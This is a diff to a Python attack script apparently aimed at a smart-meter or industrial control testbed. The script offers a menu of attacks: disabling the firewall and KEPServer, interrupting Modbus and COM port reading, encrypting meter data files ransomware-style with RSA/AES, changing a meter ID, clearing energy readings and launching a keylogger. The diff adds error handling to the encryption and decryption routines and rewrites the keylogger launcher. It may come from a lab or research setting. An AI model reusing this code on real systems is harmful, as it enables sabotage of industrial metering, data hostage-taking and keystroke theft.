@@ -97,7 +97,7 @@ def disable_kepserver():
         print("The " + output[1] + " service is " + output[9] + "\nOk.")
 
 #Run modpoll to interrupt COM1 port
-def run_modinterrup():
+def run_modinterrupt():
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
         print("Kepserver is running, Stopping now.")
@@ -107,7 +107,7 @@ def run_modinterrup():
         if "FAILED" in cp.stdout.decode('utf-8'):
             print("FAILED: " + " ".join(output[4:]) + "\nFail.")
         else:
-            print("The " + output[1] + " service is " + output[9] + "\nOk.")
+            print("The " + output[1] + " service is " + output[9])
 
 
     sleep(5)
@@ -190,17 +190,19 @@ def encrypt_Files():
 
     #exclude extensions
     excludeExtension = ['.py','.pem', '.exe']
+    try:
+        for item in recurseFiles(smartmeterpath): 
+            filePath = Path(item)
+            fileType = filePath.suffix.lower()
 
-    for item in recurseFiles(smartmeterpath): 
-        filePath = Path(item)
-        fileType = filePath.suffix.lower()
+            if fileType in excludeExtension:
+                continue
+            encrypt(filePath, pubKey)
+            print("Encrypted: " + str(filePath))
 
-        if fileType in excludeExtension:
-            continue
-        encrypt(filePath, pubKey)
-        print("Encrypted: " + str(filePath))
-
-    print("Encryption Successful.\nOk.")
+        print("Encryption Successful.\nOk.")
+    except Exception as e:
+        print("Encryption Failed.\nFail.")
 
 def encrypt(dataFile, publicKey):
     '''
@@ -257,22 +259,24 @@ def decrypt(dataFile, privatekey):
     with open(dataFile, 'rb') as f:
         # read the session key
         encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
+    try:
+        # decrypt the session key
+        cipher = PKCS1_OAEP.new(key)
+        sessionKey = cipher.decrypt(encryptedSessionKey)
 
-    # decrypt the session key
-    cipher = PKCS1_OAEP.new(key)
-    sessionKey = cipher.decrypt(encryptedSessionKey)
+        # decrypt the data with the session key
+        cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
+        data = cipher.decrypt_and_verify(ciphertext, tag)
 
-    # decrypt the data with the session key
-    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
-    data = cipher.decrypt_and_verify(ciphertext, tag)
+        # save the decrypted data to file
+        [ fileName, fileExtension ] = str(dataFile).split('.')
+        decryptedFile = fileName + '_decrypted.csv'
+        with open(decryptedFile, 'wb') as f:
+            f.write(data)
 
-    # save the decrypted data to file
-    [ fileName, fileExtension ] = str(dataFile).split('.')
-    decryptedFile = fileName + '_decrypted.csv'
-    with open(decryptedFile, 'wb') as f:
-        f.write(data)
-
-    print('Decrypted file saved to ' + decryptedFile)
+        print('Decrypted file saved to ' + decryptedFile)
+    except Exception as e:
+        print("File have not been encrypted.")
 
 #Run modpoll to change register 40201 to 26
 def changeMeterID():
@@ -307,8 +311,10 @@ def clearEnergyReading():
         print("Fail.")
 
 def runKeylogger():
-    run(['Keylogger.exe'], shell=True, stdout=PIPE, stderr=PIPE, text=True)
-    print("hello")
+    current_directory = getcwd()
+    executable_path = current_directory + "\\Keylogger.exe"
+    print("Keylogger running successfully.\nOk.")
+    check_call([executable_path])
 
 
 def revert(revertoption):
@@ -419,7 +425,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                     continue
                 decrypt(filePath, privatekey)
             print("Decryption Successful.\nOk.")
-        except Error as e:
+        except Exception as e:
             print("Decryption Failed.\nFail.")
 
     elif revertoption == "6":
@@ -576,7 +582,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                     continue
                 decrypt(filePath, privatekey)
             print("Decryption Successful")
-        except Error as e:
+        except Exception as e:
             print("Decryption Failed")
 
         print("\n==================================\n")
@@ -658,7 +664,7 @@ if __name__ == '__main__':
     elif attackoption == "5":
         disable_kepserver()
     elif attackoption == "6":
-        run_modinterrup()
+        run_modinterrupt()
     elif attackoption == "7":
         disable_COMPort()
     elif attackoption == "8":
@@ -673,7 +679,7 @@ if __name__ == '__main__':
     elif attackoption == "12":
         runKeylogger()
     elif attackoption == "-h":
-        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrup modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options.")
+        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrupt modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options, \n12 run Keylogger.")
 
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
